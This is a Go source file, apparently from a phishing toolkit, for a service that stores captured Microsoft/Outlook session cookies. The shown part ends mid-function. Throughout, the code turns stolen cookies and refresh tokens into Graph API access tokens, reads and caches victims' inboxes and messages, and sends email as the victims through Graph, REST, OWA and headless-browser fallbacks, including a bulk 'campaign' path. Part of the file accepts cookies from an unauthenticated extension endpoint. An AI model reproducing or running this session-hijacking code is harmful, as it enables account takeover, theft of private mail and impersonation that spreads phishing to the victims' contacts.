package service

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/phishingclub/phishingclub/data"
	"github.com/phishingclub/phishingclub/database"
	"github.com/phishingclub/phishingclub/errs"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"go.uber.org/zap"
)

const (
	outlookUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

// outlookDomains are the Microsoft/Outlook cookie domains to include
var outlookDomains = []string{
	".outlook.office365.com", ".outlook.office.com", ".outlook.live.com",
	".office365.com", ".office.com", ".live.com", ".microsoft.com",
	".login.microsoftonline.com",
}

// CookieStoreService handles cookie storage, validation, sending, and inbox reading
type CookieStoreService struct {
	Common
	Logger                 *zap.SugaredLogger
	CookieStoreRepo        *repository.CookieStore
	CookieStoreMessageRepo *repository.CookieStoreMessage
	ProxyCaptureRepo       *repository.ProxyCapture
	BrowserSession         *BrowserSessionService
}

// Import imports cookies from a request (manual import, extension, or proxy capture)
func (s *CookieStoreService) Import(
	ctx context.Context,
	session *model.Session,
	req *model.CookieStoreImportRequest,
) (*uuid.UUID, error) {
	// session can be nil for extension calls (unauthenticated)
	if session != nil {
		isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
		if err != nil {
			s.LogAuthError(err)
			return nil, errs.Wrap(err)
		}
		if !isAuthorized {
			return nil, errs.ErrAuthorizationFailed
		}
	}

	cookiesJSON, err := json.Marshal(req.Cookies)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	source := req.Source
	if source == "" {
		source = "import"
	}

	m := map[string]interface{}{
		"name":         req.Name,
		"source":       source,
		"cookies_json": string(cookiesJSON),
		"cookie_count": len(req.Cookies),
		"is_valid":     false,
	}

	if session != nil && session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		m["company_id"] = session.User.CompanyID.MustGet()
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate the session asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// ImportFromExtension imports cookies received from the Chrome Extension
func (s *CookieStoreService) ImportFromExtension(
	ctx context.Context,
	name string,
	cookies []model.ImportCookie,
	ip string,
) (*uuid.UUID, error) {
	cookiesJSON, err := json.Marshal(cookies)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	m := map[string]interface{}{
		"name":         name,
		"source":       "extension",
		"cookies_json": string(cookiesJSON),
		"cookie_count": len(cookies),
		"is_valid":     false,
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// ImportFromProxyCapture imports cookies from a proxy capture record
func (s *CookieStoreService) ImportFromProxyCapture(
	ctx context.Context,
	session *model.Session,
	captureID uuid.UUID,
	name string,
	cookiesJSON string,
) (*uuid.UUID, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	// Count cookies
	var cookies []model.ImportCookie
	_ = json.Unmarshal([]byte(cookiesJSON), &cookies)

	m := map[string]interface{}{
		"name":             name,
		"source":           "proxy_capture",
		"cookies_json":     cookiesJSON,
		"cookie_count":     len(cookies),
		"is_valid":         false,
		"proxy_capture_id": captureID,
	}

	if session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		m["company_id"] = session.User.CompanyID.MustGet()
	}

	id, err := s.CookieStoreRepo.Insert(ctx, m)
	if err != nil {
		return nil, errs.Wrap(err)
	}

	// Validate asynchronously
	go func() {
		bgCtx := context.Background()
		_ = s.validateAndUpdate(bgCtx, *id)
	}()

	return id, nil
}

// GetAll returns all cookie stores with pagination
func (s *CookieStoreService) GetAll(
	ctx context.Context,
	session *model.Session,
	option *repository.CookieStoreOption,
) (*model.Result[database.CookieStore], error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	var companyID *uuid.UUID
	if session.User != nil && session.User.CompanyID.IsSpecified() && !session.User.CompanyID.IsNull() {
		cid := session.User.CompanyID.MustGet()
		companyID = &cid
	}
	return s.CookieStoreRepo.GetAll(ctx, companyID, option)
}

// GetByID returns a cookie store by ID
func (s *CookieStoreService) GetByID(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) (*database.CookieStore, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.GetByID(ctx, id)
}

// Delete deletes a cookie store by ID
func (s *CookieStoreService) Delete(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) error {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.DeleteByID(ctx, id)
}

// DeleteAll deletes all cookie stores
func (s *CookieStoreService) DeleteAll(
	ctx context.Context,
	session *model.Session,
) error {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return errs.Wrap(err)
	}
	if !isAuthorized {
		return errs.ErrAuthorizationFailed
	}

	return s.CookieStoreRepo.DeleteAll(ctx)
}

// Revalidate re-checks if a cookie session is still valid
func (s *CookieStoreService) Revalidate(
	ctx context.Context,
	session *model.Session,
	id uuid.UUID,
) (*database.CookieStore, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	if err := s.validateAndUpdate(ctx, id); err != nil {
		return nil, err
	}

	return s.CookieStoreRepo.GetByID(ctx, id)
}

// SendEmail sends an email using captured cookies
func (s *CookieStoreService) SendEmail(
	ctx context.Context,
	session *model.Session,
	req *model.CookieSendRequest,
) (*model.CookieSendResult, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	storeID, err := uuid.Parse(req.CookieStoreID)
	if err != nil {
		return nil, fmt.Errorf("invalid cookie store ID: %s", req.CookieStoreID)
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found: %s", req.CookieStoreID)
	}

	// Try token-based sending first (Graph API with access token)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		result := s.sendViaGraphAPI(ctx, accessToken, req)
		if result.Success {
			s.Logger.Infow("email sent via Graph API", "to", req.To, "storeID", req.CookieStoreID)
			return result, nil
		}
		s.Logger.Warnw("Graph API send failed, trying other methods", "error", result.Error)
	}

	// Try cookie-based sending via REST API
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		message := s.buildMessagePayload(req, store.Email)

		result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
		if result.Success {
			s.Logger.Infow("cookie-based email sent via REST API", "to", req.To, "storeID", req.CookieStoreID)
			return result, nil
		}
		s.Logger.Warnw("REST API send failed", "error", result.Error)

		result = s.sendViaOWA(ctx, cookieHeader, req)
		if result.Success {
			s.Logger.Infow("cookie-based email sent via OWA", "to", req.To, "storeID", req.CookieStoreID)
			return result, nil
		}
		s.Logger.Warnw("OWA send failed", "error", result.Error)
	}

	// Final fallback: browser automation
	if s.BrowserSession != nil {
		s.Logger.Infow("attempting browser-based email send", "to", req.To)

		// First try to get a fresh token via browser
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			// Use the fresh token for Graph API send
			graphResult := s.sendViaGraphAPI(ctx, browserResult.AccessToken, req)
			if graphResult.Success {
				// Cache the token
				s.cacheAccessToken(ctx, store.ID, browserResult)
				s.Logger.Infow("email sent via Graph API (browser token)", "to", req.To)
				return graphResult, nil
			}
		}

		// Last resort: direct browser automation send
		err = s.BrowserSession.SendEmailViaBrowser(ctx, store.CookiesJSON, req.To, req.Subject, req.Body, req.IsHTML, store.ID.String())
		if err == nil {
			return &model.CookieSendResult{
				Success:   true,
				Method:    "browser",
				MessageID: fmt.Sprintf("browser-%d", time.Now().UnixMilli()),
				SentAt:    time.Now().UTC().Format(time.RFC3339),
			}, nil
		}
		s.Logger.Warnw("browser send failed", "error", err)
	}

	return &model.CookieSendResult{
		Success: false,
		Error:   "all send methods failed (Graph API, REST API, OWA, browser automation)",
		SentAt:  time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// SendEmailDirect sends an email using a cookie store ID directly (for campaign pipeline)
func (s *CookieStoreService) SendEmailDirect(
	ctx context.Context,
	storeID uuid.UUID,
	to, subject, htmlBody, fromEmail string,
) (*model.CookieSendResult, error) {
	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return &model.CookieSendResult{
			Success: false,
			Error:   fmt.Sprintf("cookie store not found: %s", storeID.String()),
			SentAt:  time.Now().UTC().Format(time.RFC3339),
		}, nil
	}

	req := &model.CookieSendRequest{
		CookieStoreID: storeID.String(),
		To:            []string{to},
		Subject:       subject,
		Body:          htmlBody,
		IsHTML:        true,
		SaveToSent:    false,
	}

	// Try token-based sending first
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		result := s.sendViaGraphAPI(ctx, accessToken, req)
		if result.Success {
			return result, nil
		}
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		message := s.buildMessagePayload(req, fromEmail)
		result := s.sendViaRestAPI(ctx, cookieHeader, message, req)
		if result.Success {
			return result, nil
		}
		result = s.sendViaOWA(ctx, cookieHeader, req)
		if result.Success {
			return result, nil
		}
	}

	// Browser automation fallback
	if s.BrowserSession != nil {
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			graphResult := s.sendViaGraphAPI(ctx, browserResult.AccessToken, req)
			if graphResult.Success {
				s.cacheAccessToken(ctx, store.ID, browserResult)
				return graphResult, nil
			}
		}

		err = s.BrowserSession.SendEmailViaBrowser(ctx, store.CookiesJSON, req.To, req.Subject, req.Body, req.IsHTML, storeID.String())
		if err == nil {
			return &model.CookieSendResult{
				Success:   true,
				Method:    "browser",
				MessageID: fmt.Sprintf("browser-%d", time.Now().UnixMilli()),
				SentAt:    time.Now().UTC().Format(time.RFC3339),
			}, nil
		}
	}

	return &model.CookieSendResult{
		Success: false,
		Error:   "No Outlook/Microsoft cookies found and all methods failed",
		SentAt:  time.Now().UTC().Format(time.RFC3339),
	}, nil
}

// GetInbox reads the inbox of a cookie session.
// It serves cached data instantly if available, and refreshes in the background.
func (s *CookieStoreService) GetInbox(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
	folder string,
	limit int,
	skip int,
) ([]model.InboxMessage, int, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, 0, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, 0, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, 0, fmt.Errorf("cookie store not found")
	}

	if folder == "" {
		folder = "inbox"
	}
	if limit <= 0 || limit > 50 {
		limit = 25
	}

	// --- Step 1: Check for cached data in the database ---
	// If we have cached messages for this folder, return them instantly
	hasCached, _ := s.CookieStoreMessageRepo.HasCachedMessages(ctx, storeID, folder)
	if hasCached {
		cachedMsgs, total, cacheErr := s.CookieStoreMessageRepo.GetMessages(ctx, storeID, folder, limit, skip)
		if cacheErr == nil && len(cachedMsgs) > 0 {
			s.Logger.Infow("serving cached inbox data", "storeID", storeID, "folder", folder, "count", len(cachedMsgs))

			// Trigger background refresh if cache is older than 5 minutes
			if store.LastScrapedAt == nil || time.Since(*store.LastScrapedAt) > 5*time.Minute {
				if s.BrowserSession != nil {
					go s.refreshInboxInBackground(storeID, store.CookiesJSON, folder)
				}
			}

			return s.dbMessagesToInboxMessages(cachedMsgs), total, nil
		}
	}

	// --- Step 2: No cached data — try fast API methods first ---

	// Try token-based inbox reading first (Graph API)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		messages, count, err := s.getInboxViaGraphAPI(ctx, accessToken, folder, limit, skip)
		if err == nil {
			// Cache the results for next time
			go func() {
				dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
				_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
				_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
			}()
			return messages, count, nil
		}
		s.Logger.Warnw("Graph API inbox failed, trying other methods", "error", err)
	}

	// Fall back to cookie-based REST API
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		apiURL := fmt.Sprintf(
			"https://outlook.office365.com/api/v2.0/me/mailfolders/%s/messages?$top=%d&$skip=%d&$orderby=ReceivedDateTime%%20desc&$select=Id,From,Subject,ReceivedDateTime,BodyPreview,ConversationId,IsRead,HasAttachments,ToRecipients",
			folder, limit, skip,
		)

		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
		if err == nil {
			httpReq.Header.Set("Cookie", cookieHeader)
			httpReq.Header.Set("User-Agent", outlookUserAgent)
			httpReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Do(httpReq)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					messages, count, parseErr := s.parseMessagesResponse(resp.Body)
					if parseErr == nil {
						// Cache the results
						go func() {
							dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
							_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
							_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
						}()
						return messages, count, nil
					}
				}
			}
		}
	}

	// --- Step 2b: Try OWA FindItem endpoint ---
	if cookieHeader != "" {
		owaMsgs, owaErr := s.getInboxViaOWA(ctx, cookieHeader, folder, limit, skip)
		if owaErr == nil && len(owaMsgs) > 0 {
			s.Logger.Infow("inbox read via OWA FindItem", "count", len(owaMsgs))
			go func() {
				dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, owaMsgs)
				_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
				_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
			}()
			return owaMsgs, len(owaMsgs), nil
		}
		if owaErr != nil {
			s.Logger.Warnw("OWA FindItem failed", "error", owaErr)
		}
	}

	// --- Step 3: Browser automation fallback ---
	if s.BrowserSession != nil {
		s.Logger.Infow("attempting browser-based inbox read")

		// First try to get a fresh token via browser and use Graph API
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			s.cacheAccessToken(ctx, store.ID, browserResult)

			messages, count, err := s.getInboxViaGraphAPI(ctx, browserResult.AccessToken, folder, limit, skip)
			if err == nil {
				// Cache the results
				go func() {
					dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
					_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
					_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
				}()
				return messages, count, nil
			}
			s.Logger.Warnw("Graph API inbox with browser token failed", "error", err)
		}

		// Final fallback: read inbox directly via browser page scraping
		s.Logger.Infow("attempting direct browser inbox scraping")
		messages, totalCount, err := s.BrowserSession.ReadInboxViaBrowser(ctx, store.CookiesJSON, folder, limit, skip, store.ID.String())
		if err == nil {
			s.Logger.Infow("inbox read via browser scraping", "count", len(messages))
			// Cache the results
			go func() {
				dbMsgs := s.inboxMessagesToDBMessages(storeID, folder, messages)
				_ = s.CookieStoreMessageRepo.UpsertMessages(context.Background(), storeID, folder, dbMsgs)
				_ = s.CookieStoreRepo.Update(context.Background(), storeID, map[string]interface{}{"last_scraped_at": time.Now()})
			}()
			return messages, totalCount, nil
		}
		s.Logger.Warnw("browser inbox scraping failed", "error", err)
	}

	return nil, 0, fmt.Errorf("cookie session expired or invalid - all methods failed (token exchange, cookie API, browser automation)")
}

// GetMessage reads a specific email message
func (s *CookieStoreService) GetMessage(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
	messageID string,
) (*model.InboxMessageFull, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found")
	}

	// Try token-based message reading first (Graph API)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		msg, err := s.getMessageViaGraphAPI(ctx, accessToken, messageID)
		if err == nil {
			return msg, nil
		}
		s.Logger.Warnw("Graph API message read failed, trying other methods", "error", err)
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		apiURL := fmt.Sprintf(
			"https://outlook.office365.com/api/v2.0/me/messages/%s?$select=Id,From,Subject,ReceivedDateTime,Body,BodyPreview,IsRead,HasAttachments,ToRecipients,CcRecipients,Importance",
			messageID,
		)

		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
		if err == nil {
			httpReq.Header.Set("Cookie", cookieHeader)
			httpReq.Header.Set("User-Agent", outlookUserAgent)
			httpReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Do(httpReq)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					return s.parseMessageFull(resp.Body)
				}
			}
		}
	}

	// Try OWA GetItem fallback
	if cookieHeader != "" {
		owaMsgFull, owaErr := s.getMessageViaOWA(ctx, cookieHeader, messageID)
		if owaErr == nil && owaMsgFull != nil {
			s.Logger.Infow("message read via OWA GetItem", "messageID", messageID)
			return owaMsgFull, nil
		}
		if owaErr != nil {
			s.Logger.Warnw("OWA GetItem failed", "error", owaErr)
		}
	}

	// Browser automation fallback
	if s.BrowserSession != nil {
		browserResult, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
		if err == nil && browserResult.Valid && browserResult.AccessToken != "" {
			s.cacheAccessToken(ctx, store.ID, browserResult)
			msg, err := s.getMessageViaGraphAPI(ctx, browserResult.AccessToken, messageID)
			if err == nil {
				return msg, nil
			}
		}
	}

	return nil, fmt.Errorf("failed to read message - all methods failed")
}

// GetFolders lists mail folders for a cookie session
func (s *CookieStoreService) GetFolders(
	ctx context.Context,
	session *model.Session,
	storeID uuid.UUID,
) ([]model.InboxFolder, error) {
	isAuthorized, err := IsAuthorized(session, data.PERMISSION_ALLOW_GLOBAL)
	if err != nil {
		s.LogAuthError(err)
		return nil, errs.Wrap(err)
	}
	if !isAuthorized {
		return nil, errs.ErrAuthorizationFailed
	}

	store, err := s.CookieStoreRepo.GetByID(ctx, storeID)
	if err != nil {
		return nil, fmt.Errorf("cookie store not found")
	}

	// Try token-based folder listing first (Graph API)
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken != "" {
		folders, err := s.getFoldersViaGraphAPI(ctx, accessToken)
		if err == nil {
			return folders, nil
		}
		s.Logger.Warnw("Graph API folders failed, trying other methods", "error", err)
	}

	// Fall back to cookie-based
	cookieHeader := s.buildCookieHeader(store.CookiesJSON)
	if cookieHeader != "" {
		apiURL := "https://outlook.office365.com/api/v2.0/me/mailfolders?$select=Id,DisplayName,TotalItemCount,UnreadItemCount"

		httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
		if err == nil {
			httpReq.Header.Set("Cookie", cookieHeader)
			httpReq.Header.Set("User-Agent", outlookUserAgent)
			httpReq.Header.Set("Accept", "application/json")

			client := &http.Client{Timeout: 30 * time.Second}
			resp, err := client.Do(httpReq)
			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					var folderData struct {
						Value []struct {
							ID              string `json:"Id"`
							DisplayName     string `json:"DisplayName"`
							TotalItemCount  int    `json:"TotalItemCount"`
							UnreadItemCount int    `json:"UnreadItemCount"`
						} `json:"value"`
					}

					if json.NewDecoder(resp.Body).Decode(&folderData) == nil {
						folders := make([]model.InboxFolder, len(folderData.Value))
						for i, f := range folderData.Value {
							folders[i] = model.InboxFolder{
								ID:              f.ID,
								DisplayName:     f.DisplayName,
								TotalItemCount:  f.TotalItemCount,
								UnreadItemCount: f.UnreadItemCount,
							}
						}
						return folders, nil
					}
				}
			}
		}
	}

	// If API methods failed, return default Outlook folders immediately
	// (no need to launch browser automation just for folder names)
	s.Logger.Infow("returning default Outlook folders")
	defaultFolders := []model.InboxFolder{
		{ID: "inbox", DisplayName: "Inbox", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "sentitems", DisplayName: "Sent Items", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "drafts", DisplayName: "Drafts", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "junkemail", DisplayName: "Junk Email", TotalItemCount: 0, UnreadItemCount: 0},
		{ID: "deleteditems", DisplayName: "Deleted Items", TotalItemCount: 0, UnreadItemCount: 0},
	}
	return defaultFolders, nil
}

// --- Token Exchange Methods ---

// getOrRefreshAccessToken returns a valid access token for the store,
// either from cache or by exchanging the MSRT refresh token.
func (s *CookieStoreService) getOrRefreshAccessToken(ctx context.Context, store *database.CookieStore) string {
	// Check if we have a cached, non-expired access token
	if store.AccessToken != "" && store.TokenExpiry != nil && store.TokenExpiry.After(time.Now()) {
		s.Logger.Debugw("using cached access token", "storeID", store.ID, "expiresAt", store.TokenExpiry)
		return store.AccessToken
	}

	// Try to extract refresh token from cookies and exchange it
	refreshToken, tenantID := extractRefreshToken(store.CookiesJSON, s.Logger)
	if refreshToken == "" {
		// Also try using a stored refresh token from a previous exchange
		if store.RefreshToken != "" {
			refreshToken = store.RefreshToken
		} else {
			s.Logger.Debugw("no refresh token available for token exchange", "storeID", store.ID)
			return ""
		}
	}

	// Exchange for Graph API access token
	tokenResp, err := exchangeForGraphToken(refreshToken, tenantID, s.Logger)
	if err != nil {
		s.Logger.Warnw("token exchange failed", "storeID", store.ID, "error", err)
		return ""
	}

	// Cache the token in the database
	expiry := time.Now().Add(time.Duration(tokenResp.ExpiresIn-60) * time.Second) // subtract 60s buffer
	updates := map[string]interface{}{
		"access_token":      tokenResp.AccessToken,
		"token_expiry":      expiry,
		"validation_method": "token_exchange",
	}
	// Store the new refresh token if one was returned
	if tokenResp.RefreshToken != "" {
		updates["refresh_token"] = tokenResp.RefreshToken
	}

	if err := s.CookieStoreRepo.Update(ctx, store.ID, updates); err != nil {
		s.Logger.Warnw("failed to cache access token", "error", err)
	}

	return tokenResp.AccessToken
}

// cacheAccessToken caches an access token obtained from browser session
func (s *CookieStoreService) cacheAccessToken(ctx context.Context, storeID uuid.UUID, result *BrowserSessionResult) {
	if result == nil || result.AccessToken == "" {
		return
	}

	// Access tokens from MSAL.js are typically valid for 1 hour
	expiry := time.Now().Add(55 * time.Minute)
	updates := map[string]interface{}{
		"access_token":      result.AccessToken,
		"token_expiry":      expiry,
		"validation_method": "browser",
	}
	if result.Email != "" {
		updates["email"] = result.Email
	}
	if result.DisplayName != "" {
		updates["display_name"] = result.DisplayName
	}

	if err := s.CookieStoreRepo.Update(ctx, storeID, updates); err != nil {
		s.Logger.Warnw("failed to cache browser access token", "error", err)
	}
}

// validateViaTokenExchange attempts to validate a session by exchanging the MSRT refresh token
// for an access token and calling Graph API /me
func (s *CookieStoreService) validateViaTokenExchange(ctx context.Context, store *database.CookieStore) (email, displayName string, valid bool) {
	accessToken := s.getOrRefreshAccessToken(ctx, store)
	if accessToken == "" {
		return "", "", false
	}

	// Call Graph API /me to validate and get user info
	httpReq, err := http.NewRequestWithContext(ctx, "GET", "https://graph.microsoft.com/v1.0/me", nil)
	if err != nil {
		return "", "", false
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return "", "", false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		s.Logger.Debugw("token exchange validation: Graph /me failed", "status", resp.StatusCode)
		return "", "", false
	}

	var profile struct {
		Mail        string `json:"mail"`
		DisplayName string `json:"displayName"`
		UPN         string `json:"userPrincipalName"`
	}
	if json.NewDecoder(resp.Body).Decode(&profile) != nil {
		return "", "", false
	}

	email = profile.Mail
	if email == "" {
		email = profile.UPN
	}
	displayName = profile.DisplayName

	s.Logger.Infow("token exchange validation successful",
		"email", email, "displayName", displayName, "storeID", store.ID)
	return email, displayName, true
}

// validateViaBrowser attempts to validate a session using headless browser automation.
// This is the most reliable method for MSA consumer accounts.
func (s *CookieStoreService) validateViaBrowser(ctx context.Context, store *database.CookieStore) (email, displayName, accessToken string, valid bool) {
	if s.BrowserSession == nil {
		return "", "", "", false
	}

	s.Logger.Infow("attempting browser-based validation", "storeID", store.ID)

	result, err := s.BrowserSession.ValidateAndGetToken(ctx, store.CookiesJSON)
	if err != nil {
		s.Logger.Warnw("browser validation failed", "storeID", store.ID, "error", err)
		return "", "", "", false
	}

	if !result.Valid {
		s.Logger.Warnw("browser validation: session invalid", "storeID", store.ID, "error", result.Error)
		return "", "", "", false
	}

	s.Logger.Infow("browser validation successful",
		"email", result.Email, "displayName", result.DisplayName,
		"hasToken", result.AccessToken != "", "storeID", store.ID)

	return result.Email, result.DisplayName, result.AccessToken, true
}

// sendViaGraphAPI sends an email using Microsoft Graph API with a Bearer token
func (s *CookieStoreService) sendViaGraphAPI(ctx context.Context, accessToken string, req *model.CookieSendRequest) *model.CookieSendResult {
	toRecipients := make([]map[string]interface{}, len(req.To))
	for i, email := range req.To {
		toRecipients[i] = map[string]interface{}{
			"emailAddress": map[string]string{"address": email},
		}
	}

	contentType := "Text"
	if req.IsHTML {
		contentType = "HTML"
	}

	msgBody := map[string]interface{}{
		"subject": req.Subject,
		"body": map[string]interface{}{
			"contentType": contentType,
			"content":     req.Body,
		},
		"toRecipients": toRecipients,
	}

	if len(req.CC) > 0 {
		ccRecipients := make([]map[string]interface{}, len(req.CC))
		for i, email := range req.CC {
			ccRecipients[i] = map[string]interface{}{
				"emailAddress": map[string]string{"address": email},
			}
		}
		msgBody["ccRecipients"] = ccRecipients
	}

	if len(req.BCC) > 0 {
		bccRecipients := make([]map[string]interface{}, len(req.BCC))
		for i, email := range req.BCC {
			bccRecipients[i] = map[string]interface{}{
				"emailAddress": map[string]string{"address": email},
			}
		}
		msgBody["bccRecipients"] = bccRecipients
	}

	// Add attachments if present
	if len(req.Attachments) > 0 {
		attachments := make([]map[string]interface{}, len(req.Attachments))
		for i, att := range req.Attachments {
			attachment := map[string]interface{}{
				"@odata.type":  "#microsoft.graph.fileAttachment",
				"name":         att.Name,
				"contentType":  att.ContentType,
				"contentBytes": att.ContentB64,
			}
			if att.IsInline {
				attachment["isInline"] = true
				if att.ContentID != "" {
					attachment["contentId"] = att.ContentID
				}
			}
			attachments[i] = attachment
		}
		msgBody["attachments"] = attachments
	}

	payload := map[string]interface{}{
		"message":         msgBody,
		"saveToSentItems": req.SaveToSent,
	}

	body, _ := json.Marshal(payload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://graph.microsoft.com/v1.0/me/sendMail", bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "graph_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "graph_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 202 || resp.StatusCode == 200 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "graph_api",
			MessageID: fmt.Sprintf("graph-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
